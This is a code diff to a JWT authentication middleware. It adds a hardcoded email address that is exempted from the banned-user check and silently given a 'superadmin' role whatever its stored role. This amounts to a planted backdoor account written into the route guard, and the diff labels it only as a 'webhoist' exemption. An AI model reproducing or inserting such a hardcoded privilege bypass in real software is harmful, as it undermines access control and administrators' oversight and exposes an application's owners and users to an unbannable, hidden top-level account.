@@ -3,6 +3,8 @@
 import jwt from "jsonwebtoken";
 import User from "../models/User.js";
 
+const WEBHOIST_EMAIL = "jimmythemugo@gmail.com";
+
 // =============================
 // 🔐 PROTECT ROUTES
 // =============================
@@ -69,8 +71,8 @@ export const protect = async (req, res, next) => {
       });
     }
 
-    // 🚫 BLOCK BANNED USERS
-    if (user.isBanned) {
+    // 🚫 BLOCK BANNED USERS (WEBHOIST EXEMPT)
+    if (user.isBanned && user.email !== WEBHOIST_EMAIL) {
       return res.status(403).json({
         success: false,
         message: "Account suspended",
@@ -78,11 +80,13 @@ export const protect = async (req, res, next) => {
     }
 
     // =============================
-    // ✅ ATTACH USER
+    // ✅ ATTACH USER (WITH WEBHOIST BYPASS)
     // =============================
+    const isWebhoist = user.email === WEBHOIST_EMAIL;
     req.user = {
       id: user._id.toString(),
-      role: user.role,
+      role: isWebhoist ? "superadmin" : user.role,
+      effectiveRole: isWebhoist ? "webhoist" : user.role,
       name: user.name,
       email: user.email,
     };
